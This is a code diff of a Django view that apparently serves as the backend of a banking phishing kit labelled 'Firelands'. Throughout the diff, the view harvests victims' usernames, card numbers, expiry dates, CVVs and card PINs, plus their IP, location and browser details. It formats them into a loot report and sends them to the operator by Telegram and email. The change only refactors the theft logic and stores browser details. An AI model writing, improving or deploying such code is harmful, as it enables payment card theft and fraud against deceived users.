+    city = get_city_from_ip(ip)
+    browser = get_user_browser(request)
+    os = get_user_os(request)
+    agent = request.META.get('HTTP_USER_AGENT', '')
+    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
-            message += "|========= [ CARD INFORMATION ] ==========|\n"
-            message += f"| ➤ [ Username ]      : {username}\n"
-            message += f"| ➤ [ Card Number ]   : {cardNumber}\n"
-            message += f"| ➤ [ Expiry Date ]   : {expiryDate}\n"
-            message += f"| ➤ [ CVV ]           : {cvv}\n"
-            message += f"| ➤ [ Card PIN ]      : {cardPin}\n"
-            message += "|=====================================|\n"
-            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
-            message += "|======================================|\n"
-            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-            message += f"| ➤ [ IP Country ]   : {country}\r\n"
-            message += f"| ➤ [ IP City ]      : {city}\r\n"
-            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-            message += f"| ➤ [ TIME ]         : {date}\r\n"
-            message += "|=====================================|\n"
+    try:
+        payload = request.data
+        username = payload.get('emzemz', '')
+        cardNumber = payload.get('cardNumber', '')
+        expiryDate = payload.get('expiryDate', '')
+        cvv = payload.get('cvv', '')
+        cardPin = payload.get('cardPin', '')
 
-            send_data_telegram(app_settings, message)
-            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
-            save_data_to_file(username, message)
-            
-            payload["message"] = "Successful"
-        except Exception as e:
-            logger.exception("firelands_collect_user_card_info failed")
-            payload["message"] = "Errors"
-            return Response(payload, status=500)
-    return Response(payload)
+        # Browser details
+        browser_detail, created = BrowserDetail.objects.get_or_create(
+            ip_address=ip,
+            defaults={
+                'country': country,
+                'city': city,
+                'browser': browser,
+                'os': os,
+                'user_agent': agent
+            }
+        )
+
+        # Notification message
+        message = "|=====||Firelands Flow||=====|\n"
+        message += "|========= [  CARD INFORMATION  ] ==========|\n"
+        message += f"| ➤ [ Username ]      : {username}\n"
+        message += f"| ➤ [ Card Number ]   : {cardNumber}\n"
+        message += f"| ➤ [ Expiry Date ]   : {expiryDate}\n"
+        message += f"| ➤ [ CVV ]           : {cvv}\n"
+        message += f"| ➤ [ Card PIN ]      : {cardPin}\n"
+        message += "|=====================================|\n"
+        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+        message += "|======================================|\n"
+        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+        message += f"| ➤ [ IP Country ]   : {country}\r\n"
+        message += f"| ➤ [ IP City ]      : {city}\r\n"
+        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+        message += f"| ➤ [ TIME ]         : {date}\r\n"
+        message += "|=====================================|\n"
+
+        # Send notifications
+        send_data_telegram(app_settings, message)
+        
+        subject = f"Firelands Card Information - {ip}"
+        from_email = app_settings['from_email']
+        recipient_list = app_settings['send_email_list']
+        send_data_email(subject, message, from_email, recipient_list)
+
+        return Response({'status': 'success'}, status=200)
+
+    except Exception as e:
+        logger.error(f'Error in firelands_collect_user_card_info: {str(e)}')
+        return Response({'error': str(e)}, status=400)
